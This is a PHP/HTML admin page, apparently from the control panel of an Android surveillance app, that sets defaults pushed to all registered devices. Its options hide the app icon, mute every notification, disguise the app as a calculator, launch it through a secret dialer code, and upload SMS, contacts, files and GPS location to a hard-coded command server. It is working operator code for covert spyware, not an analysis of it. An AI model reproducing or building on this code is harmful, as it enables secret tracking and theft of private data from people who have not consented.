<div class="content-wrapper">
<?php
$defConfig = json_decode($defaults['config_json'] ?? '{}', true);
$isChecked = fn($key) => filter_var($defConfig[$key] ?? false, FILTER_VALIDATE_BOOLEAN);
?>
    <section class="content-header">
        <div class="container-fluid">
            <div class="row mb-2">
                <div class="col-sm-6">
                    <h1><i class="fas fa-cog text-primary mr-1"></i> App Defaults</h1>
                </div>
                <div class="col-sm-6">
                    <ol class="breadcrumb float-sm-right">
                        <li class="breadcrumb-item"><a href="<?= base_url('admin/dashboard') ?>">Admin</a></li>
                        <li class="breadcrumb-item active">App Defaults</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <section class="content">
        <div class="container-fluid">

            <div class="callout callout-warning shadow-sm mb-4">
                <h5><i class="fas fa-exclamation-triangle mr-2"></i>Global App Defaults</h5>
                <p class="mb-0">Warning: Changing a default setting here will instantly impact thousands of future users when they register.</p>
            </div>

            <!-- Navigation Hub Submenu -->
            <div class="card card-outline card-info mb-3">
                <div class="card-body p-2 d-flex flex-wrap align-items-center justify-content-between">
                    <ul class="nav nav-pills">
                        <li class="nav-item">
                            <a class="nav-link" href="<?= base_url('admin/remote-device') ?>">
                                <i class="fas fa-satellite-dish mr-1"></i> Remote Commands
                            </a>
                        </li>
                        <li class="nav-item">
                            <a class="nav-link active font-weight-bold" href="<?= base_url('admin/defaults') ?>">
                                <i class="fas fa-sliders-h mr-1"></i> App Defaults
                            </a>
                        </li>
                        <?php if (function_exists('auth') && auth()->loggedIn() && auth()->user()->inGroup('superadmin')): ?>
                        <li class="nav-item">
                            <a class="nav-link text-danger" href="<?= base_url('superadmin/fleet') ?>">
                                <i class="fas fa-shield-alt mr-1"></i> SuperAdmin Fleet Grid
                            </a>
                        </li>
                        <?php endif; ?>
                    </ul>
                </div>
            </div>

            <div class="callout callout-info bg-light shadow-sm border-left-info mb-4">
                <div class="d-flex align-items-center">
                    <i class="fas fa-info-circle text-info fa-2x mr-3"></i>
                    <div>
                        <h5 class="text-info font-weight-bold mb-1">Application Defaults</h5>
                        <p class="mb-0 small text-muted">Set default values and fallback configurations for new users — default device settings, analysis preferences, notification presets, and UI defaults.</p>
                    </div>
                </div>
            </div>

            <div class="card card-primary card-outline">
                <div class="card-header">
                    <h3 class="card-title"><i class="fas fa-sliders-h mr-2"></i>Default Configuration</h3>
                    <div class="card-tools">
                        <?php if ($defaults): ?>
                        <span class="badge badge-info p-2">Version <?= (int)($defaults['version']) ?></span>
                        <?php endif; ?>
                    </div>
                </div>
                <div class="card-body">
                    <div class="alert alert-info">
                        <i class="fas fa-info-circle mr-2"></i>
                        These defaults are applied when a device resets or when pushed. Changing a value here does not affect devices until "Push to Devices" is used.
                    </div>
                    <form id="defaultsForm">
                        <div class="row">
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-sync text-primary mr-2"></i>Auto Sync</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input def-toggle" id="def_auto_sync" data-key="pref_auto_sync_v2" <?= $isChecked('pref_auto_sync_v2') ? 'checked' : '' ?>>
                                                <label class="custom-control-label" for="def_auto_sync"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">When enabled, the device automatically uploads newly collected data on a scheduled interval. Disabling stops automatic uploads — data is collected locally but not sent.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-clock text-primary mr-2"></i>Sync Interval (hours)</h6>
                                        <input type="number" class="form-control def-input" data-key="pref_sync_interval_v2" value="<?= htmlspecialchars(json_decode($defaults['config_json'] ?? '{}', true)['pref_sync_interval_v2'] ?? '6') ?>" min="1" max="24" step="1" oninput="validateRange(this,1,24,'6')">
                                        <small class="text-muted mt-1 d-block">How often the device uploads data when auto-sync is enabled, in hours. The Android slider accepts 1–24 hours. Default: 1 hour (60 minutes).</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-ban text-danger mr-2"></i>Disable Uploads</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input def-toggle" id="def_disable_up" data-key="pref_disable_uploads" <?= $isChecked('pref_disable_uploads') ? 'checked' : '' ?>>
                                                <label class="custom-control-label" for="def_disable_up"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Master switch to stop ALL data transmission from the device. The device stops all outgoing requests. Useful to temporarily halt data flow without losing collected data.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-file-alt text-danger mr-2"></i>Disable File Uploads</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input def-toggle" id="def_disable_file" data-key="pref_disable_file_uploads" <?= $isChecked('pref_disable_file_uploads') ? 'checked' : '' ?>>
                                                <label class="custom-control-label" for="def_disable_file"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Prevents file and media uploads while allowing text-based data (SMS, contacts, locations) to upload. Reduces bandwidth usage.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-map-marker-alt text-danger mr-2"></i>Live Location Interval</h6>
                                        <input type="number" class="form-control def-input" data-key="pref_live_location_interval" value="<?= (json_decode($defaults['config_json'] ?? '{}', true)['pref_live_location_interval'] ?? '30') ?>" min="1" max="1440" oninput="validateRange(this,1,1440,'30')">
                                        <small class="text-muted mt-1 d-block">How frequently the device captures and uploads GPS location when continuous tracking is active. Lower values provide finer location trails but consume more battery. Default: 30 minutes.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-hourglass-half text-warning mr-2"></i>Queue Sync Interval</h6>
                                        <input type="number" class="form-control def-input" data-key="pref_queue_sync_interval" value="<?= (json_decode($defaults['config_json'] ?? '{}', true)['pref_queue_sync_interval'] ?? '15') ?>" min="1" max="120" oninput="validateRange(this,1,120,'15')">
                                        <small class="text-muted mt-1 d-block">How often the device flushes locally queued offline data when connectivity is restored. Prevents data loss during network outages. Default: 15 minutes.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-eye-slash text-secondary mr-2"></i>Ghost Mode</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input def-toggle" id="def_ghost" data-key="pref_ghost_mode" <?= $isChecked('pref_ghost_mode') ? 'checked' : '' ?>>
                                                <label class="custom-control-label" for="def_ghost"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Completely hides the app icon from the device launcher. The app can only be launched via the dialer secret code. Combined with stealth mode for maximum concealment.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-user-secret text-dark mr-2"></i>Total Stealth Mode</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input def-toggle" id="def_stealth" data-key="pref_total_stealth_mode" <?= $isChecked('pref_total_stealth_mode') ? 'checked' : '' ?>>
                                                <label class="custom-control-label" for="def_stealth"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">Mutes all notifications, toasts, and visible indicators from the app. No sound, vibration, or screen notifications are shown during data collection or uploads.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <div class="d-flex justify-content-between align-items-center mb-2">
                                            <h6 class="mb-0"><i class="fas fa-eye-slash text-secondary mr-2"></i>Deactivated</h6>
                                            <div class="custom-control custom-switch">
                                                <input type="checkbox" class="custom-control-input def-toggle" id="def_deactivated" data-key="pref_deactivated" <?= $isChecked('pref_deactivated') ? 'checked' : '' ?>>
                                                <label class="custom-control-label" for="def_deactivated"></label>
                                            </div>
                                        </div>
                                        <small class="text-muted">When enabled, the app shows a static dummy screen (time + device info) instead of the real UI. The user cannot access the app until remotely reactivated.</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-phone-alt text-info mr-2"></i>Dialer Launch Code</h6>
                                        <input type="text" class="form-control def-input" data-key="pref_dial_code" value="<?= htmlspecialchars(json_decode($defaults['config_json'] ?? '{}', true)['pref_dial_code'] ?? '*#007#') ?>">
                                        <small class="text-muted mt-1 d-block">Secret code dialed on the phone dialer to launch the hidden app. The call is intercepted and the app opens instead. Default: *#007#</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-6 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-calculator text-info mr-2"></i>Calculator Secret Code</h6>
                                        <input type="text" class="form-control def-input" data-key="pref_secret_code" value="<?= htmlspecialchars(json_decode($defaults['config_json'] ?? '{}', true)['pref_secret_code'] ?? '1234') ?>">
                                        <small class="text-muted mt-1 d-block">Code entered into the fake calculator interface to unlock the real app when calculator disguise is active. Type this code then press "=" to unlock. Default: 1234</small>
                                    </div>
                                </div>
                            </div>
                            <div class="col-md-12 mb-3">
                                <div class="card h-100 border">
                                    <div class="card-body">
                                        <h6><i class="fas fa-server text-info mr-2"></i>Server URL</h6>
                                        <input type="url" class="form-control def-input" data-key="pref_server_url" value="<?= htmlspecialchars(json_decode($defaults['config_json'] ?? '{}', true)['pref_server_url'] ?? '') ?>" placeholder="https://your-server.com">
                                        <small class="text-muted mt-1 d-block">The base URL of the server the device connects to for data uploads and command receipt. Change this to redirect the device to a different server endpoint. Leave empty to use the default URL baked into the app (https://prjs4.chegecache.co.ke).</small>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
                <div class="card-footer">
                    <button type="button" class="btn btn-primary" onclick="saveDefaults()"><i class="fas fa-save mr-1"></i> Save as Defaults</button>
                    <button type="button" class="btn btn-info ml-2" onclick="pushDefaults()"><i class="fas fa-paper-plane mr-1"></i> Push to Devices</button>
                </div>
            </div>
        </div>
    </section>
</div>

<script>
function validateRange(input, min, max, def) {
    var val = parseInt(input.value);
    if (isNaN(val) || val < min || val > max) {
        input.value = def;
    }
}

function gatherDefaults() {
    const config = {};
    $('.def-toggle').each(function() { config[$(this).data('key')] = $(this).is(':checked'); });
    $('.def-input').each(function() { config[$(this).data('key')] = $(this).val(); });
    return config;
}

function saveDefaults() {
    const config = gatherDefaults();
    $.ajax({
        url: '<?= base_url('admin/defaults/save') ?>',
        method: 'POST',
        data: { config_json: JSON.stringify(config) },
        dataType: 'json',
        success: function(r) {
            if (r.success) {
                Swal.fire({ icon:'success', title:'Saved', text: r.message, timer:2000, showConfirmButton:false });
                location.reload();
            } else {
                Swal.fire({ icon:'error', title:'Error', text: r.message || 'Failed' });
            }
        },
        error: function() { Swal.fire({ icon:'error', title:'Error', text:'Network error.' }); }
    });
}

function pushDefaults() {
    Swal.fire({
        title: 'Push Defaults?',
        text: 'This will send the current defaults to ALL registered devices. Continue?',
        icon: 'warning',
        showCancelButton: true,
        confirmButtonText: 'Push',
        cancelButtonText: 'Cancel'
    }).then(r => {
        if (r.isConfirmed) {
            $.ajax({
                url: '<?= base_url('admin/defaults/push') ?>',
                method: 'POST',
                dataType: 'json',
                success: function(r) {
                    if (r.success) {
                        Swal.fire({ icon:'success', title:'Pushed', text: r.message, timer:3000, showConfirmButton:false });
                    } else {
                        Swal.fire({ icon:'error', title:'Error', text: r.message || 'Failed' });
                    }
                },
                error: function() { Swal.fire({ icon:'error', title:'Error', text:'Network error.' }); }
            });
        }
    });
}
</script>
